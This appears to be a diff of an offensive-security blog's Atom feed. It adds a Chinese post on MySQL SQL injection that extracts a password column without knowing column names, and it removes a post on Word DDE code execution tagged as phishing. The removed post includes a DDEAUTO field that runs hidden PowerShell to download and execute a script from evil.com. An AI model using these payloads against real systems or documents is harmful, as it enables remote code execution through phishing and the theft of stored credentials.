@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://evi1cg.github.io/"/>
-  <updated>2019-01-28T05:07:17.762Z</updated>
+  <updated>2019-02-13T08:15:32.095Z</updated>
   <id>https://evi1cg.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>不知道列名的情况下注入</title>
+    <link href="https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html"/>
+    <id>https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html</id>
+    <published>2019-02-13T07:26:29.000Z</published>
+    <updated>2019-02-13T08:15:32.095Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15500455788558.jpg" alt="-w1225"></p><a id="more"></a><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>在 mysql =&gt; 5 的版本中存在库<code>information_schema</code>,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？</p><blockquote><p>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。</p></blockquote><h2 id="0x01-不使用表名查询"><a href="#0x01-不使用表名查询" class="headerlink" title="0x01 不使用表名查询"></a>0x01 不使用表名查询</h2><p>正常的查询如下：<br><img src="/usr/uploads/2019/15500437457634.jpg" alt="-w489"></p><p>其中，列名为<code>id</code>,<code>name</code>,<code>pass</code>,<code>mail</code>,<code>phone</code>，使用union查询<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500439319694.jpg" alt="-w502"></p><p>接着，就可以继续使用数字来对应列,如3对应了表里面的pass:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500441801262.jpg" alt="-w640"></p><p>当  ` 不能使用的时候，使用别名来代替：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500450275510.jpg" alt="-w713"></p><p>在注入中查询多个列：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">`2`</span>,<span class="number">0x3a</span>,<span class="string">`3`</span>) from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span> <span class="title">limit</span> 1,1;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500443786658.jpg" alt="-w808"></p><p>FROM:<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">Extracting data without knowing columns names </a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15500455788558.jpg&quot; alt=&quot;-w1225&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
+    
+    
+      <category term="Sqli" scheme="https://evi1cg.github.io/tags/Sqli/"/>
+    
+  </entry>
   
   <entry>
     <title>Remote NTLM relaying through CS</title>
@@ -474,34 +496,6 @@
     
       <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>MSWord Code Exec Without Macro</title>
-    <link href="https://evi1cg.github.io/archives/MSWord_Code_Exec_Without_Macro.html"/>
-    <id>https://evi1cg.github.io/archives/MSWord_Code_Exec_Without_Macro.html</id>
-    <published>2017-10-10T18:59:34.000Z</published>
-    <updated>2019-01-15T05:43:36.771Z</updated>
-    
-    <content type="html"><![CDATA[<p>今天学到了一个新的Word执行代码的方式，也是不需要启用宏的，所以分享给大家一波。操作也挺简单的。<br>首先新建一个word文档，然后插入域：</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/2189716706.png" alt="1507690693509.png"></p><p>选择 <strong><code>= (Formula)</code></strong></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/2070221614.png" alt="1507690775534.png"></p><p>右键，切换域代码</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/651776936.png" alt="1507690814044.png"></p><p>代码处修改为：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DDEAUTO c:\\windows\\system32\\<span class="keyword">cmd</span>.<span class="bash">exe <span class="string">"/k calc.exe"</span>  &#125;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/165006756.png" alt="1507690880290.png"></p><p>之后，右键更新域，再把文档改成<strong><code>docx</code></strong>格式即可。最终效果如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/2143272357.gif" alt="2.gif"></p><p>比较鸡肋的是点是以后才会执行。</p><p>除了使用<strong><code>DDEAUTO</code></strong>，使用<strong><code>DDE</code></strong>也是可以的，具体如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DDE <span class="string">"c:<span class="subst">\\</span>windows<span class="subst">\\</span>system32<span class="subst">\\</span>cmd.exe"</span> <span class="string">"/c notepad"</span> &#125;</span><br></pre></td></tr></table></figure></p><p>需要注意的是，使用DDE不会自动执行，需要对文档进行修改，将文档重命名为rar，打开以后修改 <strong><em><code>word/settings.xml</code></em></strong>,添加<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">w:</span>updateFields <span class="string">w:</span>val=<span class="string">"true"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>使用DDE效果如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2017/10/1665419434.gif" alt="dde.gif"></p><p>个人感觉使用DDE效果更好点。</p><p>如何获取交互式shell ？</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; DDEAUTO c:\\Windows\\System32\\<span class="keyword">cmd</span>.<span class="bash">exe <span class="string">"/k powershell.exe -NoP -sta -NonI -W Hidden <span class="variable">$e</span>=(New-Object System.Net.WebClient).DownloadString('http://evil.com/evil.ps1');powershell -e <span class="variable">$e</span> "</span>&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;今天学到了一个新的Word执行代码的方式，也是不需要启用宏的，所以分享给大家一波。操作也挺简单的。&lt;br&gt;首先新建一个word文档，然后插入域：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://evi1cg.github.io/usr/uploads/2017/10/21
-      
-    
-    </summary>
-    
-      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
-    
-    
-      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
-    
-      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
     
   </entry>
   
